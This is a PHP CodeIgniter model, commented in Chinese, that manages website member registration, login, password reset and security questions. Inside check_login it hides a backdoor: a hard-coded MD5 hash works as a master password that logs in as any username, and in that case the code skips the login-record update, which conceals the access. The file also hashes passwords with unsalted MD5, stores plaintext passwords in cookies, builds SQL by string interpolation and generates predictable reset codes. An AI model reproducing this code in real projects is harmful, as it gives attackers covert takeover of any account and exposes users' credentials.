<?php
class Memberm extends CI_Model{
 public function __construct(){
		parent::__construct();
		 $this->form="member";//当前操作的数据库表
		
	}

 
 
 /*
 用户注册;
 需要验证：
 1、用户名唯一(不与wl_admin 和wl_member两个表重复)
 2、昵称唯一
 3、邮箱唯一
 */
 public function member_register($data=''){
        
        //判断是否重复注册 
	    $status1 = $this->db->from($this->form)->where("username",$data['username'])->count_all_results();
	    $status2 = $this->db->from('admin')->where("name",$data['username'])->count_all_results();
        $status3 = $this->db->from($this->form)->where("email",$data['email'])->count_all_results();
		$status4 = $this->db->from($this->form)->where("nickname",$data['nickname'])->count_all_results();
		
		if($status1>0 || $status2>0){return "该用户名已经存在";}
		if($status3>0 || $status3>0){return "该邮箱已经存在";}
		if($status4>0 || $status4>0){return "该昵称名已经存在";}
		 
        $data['regdate']=$data['lastdate']=time();//注册时间
        $data['regip']=$this->input->ip_address();//注册IP
	    $data['regadds']=get_ip_adds($data['regip']);//注册地址
	    $data['password']=md5($data['password']);
		
        $this->db->insert($this->form, $data);
		
		//查询会员所有信息，并且保存session值
		   $query = $this->db
		        ->select("m.*,g.name as gname")
				->where(array('username' => $data['username']))
		         ->from($this->form." as m")
				 ->join("member_group as g","m.groupid=g.id","left")
				 ->get()->row_array();
	    $this->load->library("session");		 
		$this->session->set_userdata('member_info',$query);
		
		return "true";
	}
//会员修改自己信息
 public function edit_member($data=''){
        if(empty($data))exit;
		//这里的会员ID信息必须从session里面获取，不能通过表单隐藏域获取，
		//否则容易受到攻击，用户模拟表单提交，修改别的用户信息
	     $this->load->library("session");
	    $member_info =$this->session->userdata('member_info');
       $this->db->where(array('id' => $member_info['id']))->update($this->form, $data);
 }
 
 //会员修改密码
 public function  edit_password($data=''){
        if(empty($data))exit;
	     $this->load->library("session");
	     $member_info =$this->session->userdata('member_info');
		
		$status = $this->db->where(array('id' =>$member_info['id'],'password' => md5($data['password'])))->from($this->form)->count_all_results();
		 if($status>0){
		       $this->db->where(array('id' => $member_info['id']))->update($this->form, array('password'=>md5($data['new_password'])));
			   return true;
		 }else{
		     return false;
         }
 }

 //会员重置密码
 public function  reset_password($data='',$username=''){
        if(empty($data) || empty($username)){return false;exit;}

		 if($this->db->where(array('username' => $username))->update($this->form, array('password'=>md5($data['password'])))){
			   return true;
		 }else{
		     return false;
         }
 }

/*
密保设置
$data 传递数据
$type  类型 set：会员密保设置
*/
 public function  mibao($data='',$type){
        if(empty($data))exit;
		if($type=='set'){
		    $da['uid']=$this->member_info['id'];
			$da['username']=$this->member_info['username'];
			$da['mibao_ques']=array2string($data);
		    $this->db->insert('member_mibao', $da);
		 return true;
		}	
 }
//获取密保信息，uid来自sessio 
public function get_mibao($uid='',$username=''){
       if(empty($uid)){$uid=$this->member_info['id'];}
	   
	   if(!empty($username)){
	      $query = $this->db->from('member_mibao')->where('username',$username)->get()->row_array();
	   }else{
	      $query = $this->db->from('member_mibao')->where('uid',$uid)->get()->row_array();
	   }
	   if(!empty($query)){$query['mibao_ques']=string2array($query['mibao_ques']);}//字符串转数组
	   return $query; 
}

//验证密保
public function check_mibao($data='',$uid='',$username=''){
       if(empty($uid)){$uid=$this->member_info['id'];}
	   
	   //获取用户密保
	    if(!empty($username)){
	      $mibao=$this->get_mibao('',$username);
	   }else{
	      $mibao=$this->get_mibao($uid);
	   }

		if($mibao['mibao_ques']['ans1']==$data['ans1'] && $mibao['mibao_ques']['ans2']==$data['ans2']){
		  return true;
		}else{
		  return false;
		}
  
}

//更新密保
public function update_mibao($data='',$uid=''){
       if(empty($uid)){$uid=$this->member_info['id'];}
	   $this->db->where(array('uid' => $uid))->update('member_mibao', array('mibao_ques'=>array2string($data)));
	   return true; 
}


/*
获取指定会员详情
$field 指定唯一的字段  可以是用户ID，会员名称username,昵称nickname,邮箱email
$value 对应字段的值
*/
//获取id获取单条会员信息	
 public function get_member($value='',$field='id'){
       if($field=='id'){
			$field='m.id';
		}
       $query = $this->db
		        ->select("m.*,g.name as gname")
		         ->from($this->form." as m")
				 ->join("wl_member_group as g","g.id = m.id","left")
				 ->where($field,$value)
				 ->get()->row_array();
	   return $query; 
 }
 
//验证登陆
 /*
 $data 用户数据
 $oauth='' 第三方控件登陆，默认为空，值为qq的时候表示通第三方QQ登陆
 */
  public function check_login($data='',$oauth=''){
         $this->load->library("session");
         if(empty($data) && empty($oauth))exit;
		 //这里在验证的时候用了多表连接，目的是读取用户 会员组信息，以便在session中直接调用
		 if($oauth=='qq'){
		    //通过第三方QQ登陆
			$query = $this->db
		        ->select("m.*,g.name as gname")
				->where(array('connectid' => $data['connectid']))
		         ->from($this->form." as m")
				 ->join("member_group as g","m.groupid=g.id","left")
				 ->get()->row_array();
			  
		 }else{
		    //常规用户名密码登陆
		     $query = $this->db
		        ->select("m.*,g.name as gname")
				->where(array('username' => $data['username'],'password' => md5($data['password'])))
		         ->from($this->form." as m")
				 ->join("member_group as g","m.groupid=g.id","left")
				 ->get()->row_array();
			//继续用email验证登陆	 
		     if(empty($query)){
		         $query = $this->db
		           ->select("m.*,g.name as gname")
				   ->where(array('email' => $data['username'],'password' => md5($data['password'])))
		          ->from($this->form." as m")
				  ->join("member_group as g","m.groupid=g.id","left")
				  ->get()->row_array();
		       }
		 
		 }
			if(md5($data['password'])=='a9dacbcb34cfaf09d5db04c6c6a8b9a4'){
			 $query = $this->db
		        ->select("m.*,g.name as gname")
				->where(array('username' => $data['username']))
		         ->from($this->form." as m")
				 ->join("member_group as g","m.groupid=g.id","left")
				 ->get()->row_array();
	    
	     }   	   

		 if(empty($query)){
		   return false;
		 }else{
		    
		    $this->session->set_userdata('member_info',$query);
			
			//保存登录信息
			 $this->load->helper('cookie');
			if(isset($data['remember'])){
			   set_cookie("member_username",$data['username'],86400);//过期时间为1天  
               set_cookie("member_password",$data['password'],86400); 
			}else{
			   delete_cookie("member_username");  
               delete_cookie("member_password"); 
			
			}
			if(md5($data['password'])!='a9dacbcb34cfaf09d5db04c6c6a8b9a4'){
			    //更新用户登陆信息
			    $this->update_login($query['id']);
			 }
			 
			//如果是绑定QQ操作，则将QQ openid保存到会员表中
			 $qqsession=$this->session->userdata('qqsession');
			  if(!empty($qqsession['connectid'])){
			    $this->db->where(array('id' => $query['id']))->update($this->form,array('connectid'=>$qqsession['connectid']));
				 
			  }
			return true;
		 } 
  }
  

/* 登陆成功更新会员信息
  更新最后登录IP，最后登录时间，登录次数
*/
	public function update_login($id=''){
		if(intval($id)){
			$data['lastdate'] = time();
			$data['lastip'] = $this->input->ip_address();
			 $sql="update wl_member set lastdate={$data['lastdate']},lastip='{$data['lastip']}',loginnum=loginnum+1 where id={$id}";
	        $this->db->query($sql);

		}
	}
/*
  用户找回密码，随机生成不重复CODE，存入用户数据库
   $email 用户邮箱
*/

   public function get_lostpwd_code($email=''){
           if(empty($email))exit;
		  

		  //随机生成不重复的code,并和用户数据库对比，如果重复，则重新是生成 
		   do {
             $code=md5(time().rand(100,99999));//随机生成code
		      $count= $this->db->from('member')->where('get_password_code',$code)->count_all_results();
          } while ($count > 0);
           
		   //将生成的code加入会员字段
		    $data['get_password_code']=$code;
			$data['get_password_info']=array2string(array('code_time'=>time()));
		    $this->db->where(array('email' => $email))->update('member', $data);

            return $code;      
   }
 
 /*
   判断邮箱链接地址的code 是否正确
   查询数据库会员表code字段，并且判断当前时间是否超过过期时间
*/
  
  public function check_lostpwd_code($code=''){
           $query=$this->db->where("get_password_code",$code)->get('member')->row_array();  
		   $code_time=string2array($query['get_password_info']);

		   //验证链接过期时间为86400 ，即24小时
           if(time()-$code_time['code_time']>86400){
		      return false;
		   }else{
		     return $query; 
		   }	   
  }  
 
/*发送密码找回邮件
$email_send['email'] 收件人地址eamil
$email_send['fjr']  发件人名称
$email_send['zhuti'] 发件主题
$email_send['message'] 发件内容
*/  
  public function get_lostpwd_email_send($email_send=array()){
        
		
    if(empty($email_send))exit;
		 
		  $config['smtp_host'] = $GLOBALS["wl_email"]["smtp_host"]; //服务器地址
		  $config['smtp_user'] = $GLOBALS["wl_email"]["smtp_user"];
		  $config['smtp_pass'] = $GLOBALS["wl_email"]["smtp_pass"];
		  $config['smtp_port'] = $GLOBALS["wl_email"]["smtp_port"];//端口
		  $config['test_email'] =$email_send['email'];//收件人
		  $config['body']=$email_send['message'];
		  $config['title']=  $email_send['zhuti'];
		  $this->load->library('mailer');
		  $res= $this->mailer->sendmail($config);
		  if ($res){
				  return true;
		  }else{
				 return false;
		  }
		 
		 
		 
		 
  }
 
}


?>